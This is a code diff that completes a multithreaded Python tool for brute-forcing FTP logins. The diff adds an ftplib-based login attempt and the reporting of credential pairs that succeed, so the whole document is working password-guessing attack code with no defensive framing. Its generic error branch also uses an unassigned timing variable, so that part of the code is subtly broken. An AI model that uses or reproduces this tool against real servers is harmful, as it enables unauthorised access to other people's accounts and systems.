@@ -1,5 +1,6 @@
 #! /usr/bin/env python3
 
+import ftplib
 from datetime import date
 from optparse import OptionParser
 from colorama import Fore, Back, Style
@@ -27,7 +28,19 @@ port = 21
 lock = Lock()
 
 def login(ftp_server, port, user, password):
-    pass
+    t1 = time()
+    try:
+        server = ftplib.FTP()
+        server.connect(ftp_server, port)
+        server.login(user, password)
+        server.close()
+        t2 = time()
+        return True, t2-t1
+    except ftplib.error_perm:
+        t2 = time()
+        return False, t2-t1
+    except Exception as err:
+        return err, t2-t1
 def brute_force(thread_index, ftp_server, port, credentials):
     successful_logins = {}
     for credential in credentials:
@@ -37,13 +50,13 @@ def brute_force(thread_index, ftp_server, port, credentials):
             if status[0] == True:
                 successful_logins[credential[0]] = credential[1]
                 with lock:
-                    display(' ', f"Thread {thread_index+1}:{status[2]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET} => {Back.MAGENTA}{Fore.BLUE}Authorized{Fore.RESET}{Back.RESET} ({Back.CYAN}{status[1]}{Back.RESET})")
+                    display(' ', f"Thread {thread_index+1}:{status[1]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET} => {Back.MAGENTA}{Fore.BLUE}Authorized{Fore.RESET}{Back.RESET}")
             elif status[0] == False:
                 with lock:
-                    display(' ', f"Thread {thread_index+1}:{status[2]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET} => {Back.RED}{Fore.YELLOW}Access Denied{Fore.RESET}{Back.RESET}")
+                    display(' ', f"Thread {thread_index+1}:{status[1]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET} => {Back.RED}{Fore.YELLOW}Access Denied{Fore.RESET}{Back.RESET}")
             else:
                 with lock:
-                    display(' ', f"Thread {thread_index+1}:{status[2]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET} => {Fore.YELLOW}Error Occured : {Back.RED}{status[0]}{Fore.RESET}{Back.RESET}")
+                    display(' ', f"Thread {thread_index+1}:{status[1]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET} => {Fore.YELLOW}Error Occured : {Back.RED}{status[0]}{Fore.RESET}{Back.RESET}")
     return successful_logins
 def main(server, port, credentials):
     successful_logins = {}
